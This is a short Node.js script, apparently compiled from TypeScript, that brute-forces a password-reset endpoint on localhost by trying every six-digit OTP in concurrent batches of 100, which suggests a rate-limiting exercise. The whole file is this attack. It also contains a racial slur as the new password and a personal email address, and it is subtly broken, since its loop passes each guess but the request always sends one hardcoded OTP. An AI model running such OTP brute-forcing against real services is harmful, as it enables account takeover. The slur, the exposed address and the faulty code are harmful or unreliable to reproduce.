"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
async function sendRequest(otp) {
    let data = JSON.stringify({
        email: "spandan.mozumder.prof@gmail.com",
        otp: "117937",
        newPassword: "GIGANIGGA",
    });
    let config = {
        method: "post",
        maxBodyLength: Infinity,
        url: "http://localhost:3000/reset-password",
        headers: {
            "Content-Type": "application/json",
        },
        data: data,
    };
    try {
        await axios_1.default.request(config);
    }
    catch (e) {
    }
}
async function main() {
    for (let i = 0; i <= 999999; i += 100) {
        const p = [];
        console.log(i);
        for (let j = 0; j < 100; j++) {
            p.push(sendRequest((i + j).toString()));
        }
        await Promise.all(p);
    }
}
main();
